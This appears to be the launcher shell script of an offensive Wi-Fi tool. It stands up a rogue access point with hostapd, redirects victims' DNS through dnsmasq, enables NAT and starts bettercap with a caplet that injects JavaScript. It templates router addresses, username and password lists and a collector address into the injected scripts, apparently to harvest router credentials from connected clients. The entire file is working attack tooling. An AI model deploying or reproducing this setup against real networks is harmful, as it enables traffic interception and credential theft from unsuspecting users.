#!/bin/bash

#        _      _ _     _     _
#       | |    (_) |   | |   | |
#     __| |_ __ _| |__ | |__ | | ___
#    / _` | '__| | '_ \| '_ \| |/ _ \
#   | (_| | |  | | |_) | |_) | |  __/
#    \__,_|_|  |_|_.__/|_.__/|_|\___|
#
# 	Author: Federico 'rhaidiz' De Meo

GREEN='\033[0;32m'
ORANGE='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

function message {
	col=""
	if [ $1 == "info" ]
	then
		col="$GREEN[*]"
	elif [ $1 == "w" ]
	then
		col="$ORANGE[W]"
	elif [ $1 == "e" ]
	then
		col="$RED[E]"
	else
		col="$NC[*]"
	fi
	echo -e "$col $2 $NC"
}


function close {
	# reset everything
	pkill dnsmasq
	pkill hostapd
	pkill bettercap
	pkill nodejs
	for i in "${routerips[@]}"
	do
		:
		ip addr del $i dev $phy
	done
	ip addr del 10.0.0.1/24 dev $phy
	iptables -t nat -F
	iptables -t mangle -F
	exit
}

# this needs root

if [ "$EUID" -ne 0 ]
	then 
		message "e" "Run as root"
	exit
fi

cat << "EOF"
        _      _ _     _     _
       | |    (_) |   | |   | |
     __| |_ __ _| |__ | |__ | | ___
    / _` | '__| | '_ \| '_ \| |/ _ \
   | (_| | |  | | |_) | |_) | |  __/
    \__,_|_|  |_|_.__/|_.__/|_|\___|

   Author: Federico 'rhaidiz' De Meo

EOF

# check if something is listening on port 80

http=`netstat -A inet,inet6 -ap | grep "LISTEN" | grep "http" | awk '{ print $7 }' | cut -d: -f1 | sort -u`
if [ -n "$http" ]
then
	message "w" "Terminate http"
	message "nc" $http
	exit
fi

# terminate wpa_supplicant as it interfears with hostapd
pkill wpa_supplicant


###########################
# Load configuration file #
###########################

message "nc" "Loading configuration ... "

source config

http=""
binjector=""
for i in "${routerips[@]}"
do
	:
	# create the string that we will use in the other scripts
	http="$http\"`echo $i | awk -F'/' '{print $1}'`\/\","
	binjector="$binjector\"`echo $i | awk -F'/' '{print $1}'`\","
done

http=`echo $http | sed 's/,$//'`
binjector=`echo $binjector | sed 's/,$//'`
# echo "[${http}]"
# echo "[${binjector}]"

# add routers ips in the JavaScript
sed -e "s/\${r}/[${binjector}]/" tmpl/inject-dribble-tmpl.js > inject-dribble.js
sed -e "s/\${r}/[${http}]/" tmpl/nodehttpserver-tmpl.js > nodehttpserver.js

# add usernames and passwords (in the last sed I use ; as separator)
sed -e "s/\${u}/${usernames}/" tmpl/dribble-tmpl.js | sed -e "s/\${p}/${passwords}/" | sed -e "s;\${c};${collector};" > www/js/dribble.js

message "info" "done!"

message "nc" "Network configuration ... "
# configure network interfaces
ip addr add 10.0.0.1/24 dev $phy

# here add new IPs to phy so that I can cache the victim
# ip addr add 192.168.0.1/24 dev $phy
for i in "${routerips[@]}"
do
	:
	ip addr add $i dev $phy
done

# bring interface up
ip link set dev $phy up

##################
# IPTABLES
##################

# Enable Internet connection sharing
# configuring ip forwarding
echo '1' > /proc/sys/net/ipv4/ip_forward

# configuring NAT
iptables -A FORWARD -i $internet -o $phy -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A FORWARD -i $phy -o $internet -j ACCEPT
iptables -t nat -A POSTROUTING -o $internet -j MASQUERADE

message "info" "done!"

##################
# DNSMASQ
##################

message "nc" "Starting dnsmasq ... "
echo "
interface=$phy

bind-interfaces

# Set default gateway
dhcp-option=3,10.0.0.1

# Set DNS servers to announce
dhcp-option=6,10.0.0.1

dhcp-range=10.0.0.2,10.0.0.10,12h

no-hosts
addn-hosts=$(pwd)/dnsentries.hosts

no-resolv
log-queries
log-facility=/var/log/dnsmasq.log

server=8.8.8.8
server=8.8.4.4

" > tmp-dnsmasq.conf

# start dnsmasq which provides DNS relaying service
dnsmasq --conf-file=tmp-dnsmasq.conf

message "info" "done!"

##################
# HOSTAPD
##################

message "nc" "Starting hostapd ... "

echo "ctrl_interface=/var/run/hostapd

interface=$phy

# ESSID
ssid=$essid

driver=nl80211
auth_algs=3
channel=11
hw_mode=g

# all mac addresses allowed
macaddr_acl=0

# Filter allowed mac addresses
# macaddr_acl=1
# accept_mac_file=./accepted_mac

wmm_enabled=0" > tmp-hotspot.conf

#echo "Start hostapd in screen hostapd"
screen -dmS hostapd hostapd tmp-hotspot.conf

if screen -list | grep -q "hostapd"; then
	message "info" "done!"
else
	message "e" "Error starting hostapd!"
	close
fi


##################
# NODE.JS
##################

# start the web server
message "nc" "Starting the HTTP server in screen httpnode ..."
screen -dmS nodehttp nodejs nodehttpserver.js
if screen -list | grep -q "nodehttp"; then
	message "info" "done!"
else
	message "e" "Error starting NodeJS web server!"
	close
fi

##################
# BETTERCAP
##################

# start bettercap"
 message "nc" "Starting bettercap in screen bettercap ... "
 screen -dmS bettercap bettercap -caplet dribble.cap -silent -iface $phy
 if screen -list | grep -q "bettercap"; then
 	message "info" "done!"
 else
 	message "e" "Error starting bettercap!"
 	close
 fi
 
 message "info" "Ready ... GO!"
 echo ""

echo "Hit enter to kill"
read
close
